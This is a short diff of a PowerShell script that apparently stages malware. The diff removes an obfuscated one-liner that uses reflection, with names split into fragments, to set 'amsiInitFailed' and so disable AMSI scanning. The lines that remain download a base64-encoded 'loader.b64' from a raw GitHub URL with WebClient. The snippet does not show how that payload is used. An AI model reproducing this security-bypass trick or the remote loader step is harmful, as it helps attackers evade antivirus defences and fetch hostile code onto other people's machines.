@@ -3,8 +3,6 @@
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 Start-Sleep -Milliseconds 500
-$tanhd2_1='A';$tanhd2_3='i';$tanhd2_2='ms';$tanhd2=$tanhd2_1+$tanhd2_2+$tanhd2_3;$cuongnh45_1='am';$cuongnh45_2='si';$cuongnh45_3='Ini';$cuongnh45_4='tFa';$cuongnh45_5='il';$cuongnh45_6='ed';$cuongnh45=$cuongnh45_1+$cuongnh45_2+$cuongnh45_3+$cuongnh45_4+$cuongnh45_5+$cuongnh45_6;$phuoctt2_1='No';$phuoctt2_2='nPu';$phuoctt2_3='bli';$phuoctt2_4='c,St';$phuoctt2_5='at';$phuoctt2_6='ic';$phuoctt2=$phuoctt2_1+$phuoctt2_2+$phuoctt2_3+$phuoctt2_4+$phuoctt2_5+$phuoctt2_6;$ex=$null;$bonus_withluv1=[Ref];$bonus_withluv2=$bonus_withluv1.Assembly;$bonus_withluv3=$bonus_withluv2.GetType("System.Management.Automation."+$tanhd2+"U"+"tils");$test=$bonus_withluv3.GetField($cuongnh45,$phuoctt2);$test.SetValue($ex,$true)
-
 # Dùng WebClient thay vì Invoke-WebRequest
 $wc = New-Object System.Net.WebClient
 $base64_str = $wc.DownloadString("https://raw.githubusercontent.com/0xKaiser/test/0xKaiser-patch-1/loader.b64")
